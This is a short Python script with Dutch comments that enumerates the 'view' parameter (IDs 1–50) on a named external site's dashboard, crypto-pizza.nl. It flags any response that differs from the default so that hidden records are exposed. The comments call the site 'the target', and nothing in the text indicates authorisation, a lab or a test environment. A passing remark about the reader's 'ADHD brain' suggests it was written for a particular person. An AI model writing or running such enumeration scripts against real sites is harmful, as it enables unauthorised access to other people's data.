import requests
import time

# Het doelwit
base_url = "https://crypto-pizza.nl/dashboard"

print("[*] Starten van ID-Enumeratie op de 'view' parameter...")

for i in range(1, 51):
    # We bouwen de URL met een getal (ID)
    params = {'view': i, 'filter': 'none', 'accesskey': 'undefined'}
    
    try:
        response = requests.get(base_url, params=params)
        
        # We kijken of het antwoord anders is dan de standaard 'null'
        if "null" not in response.text.lower():
            print(f"[!] BINGO! ID {i} geeft een afwijkend resultaat:")
            print(f"    Inhoud: {response.text[:100]}...")
        else:
            # Een kleine voortgangsmelder voor je ADHD-brein (zo zie je dat er iets gebeurt)
            if i % 10 == 0:
                print(f"[*] Bezig... getal {i} gecheckt.")
                
    except Exception as e:
        print(f"[X] Fout bij ID {i}: {e}")
    
    # Een hele korte pauze om de server niet te laten crashen
    time.sleep(0.1)

print("[*] Scan voltooid.")